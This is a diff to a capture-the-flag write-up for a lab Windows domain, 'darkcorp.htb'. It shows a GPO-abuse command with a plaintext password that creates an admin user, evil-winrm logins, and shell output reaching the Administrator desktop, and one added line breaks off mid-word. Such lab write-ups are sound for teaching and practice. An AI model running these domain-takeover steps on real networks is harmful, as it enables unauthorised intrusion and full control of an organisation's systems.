@@ -1363,7 +1363,7 @@ python3 pygpoabuse.py 'darkcorp.htb'/'taylor.b.adm':'!QAZzaq1' -gpo-id '652CAE9A
 [+] ScheduledTask TASK_f7202c64 created!
 ```
 
-Ill set the schedules task
+Ill set the schedules task, this will create a admin user on the machine called `john` with the passw
 
 ```python
 evil-winrm -i dc-01.darkcorp.htb -u taylor.b.adm -p '!QAZzaq1'       
@@ -1398,6 +1398,31 @@ SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\john:H4x00r
 ```
 
 Full domain compromise!
+
+```python
+evil-winrm -i dc-01.darkcorp.htb -u john -p 'H4x00r123..'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\john\Documents> cd ../../Administrator/Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         9/10/2026   9:11 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop>
+```
 
 
 
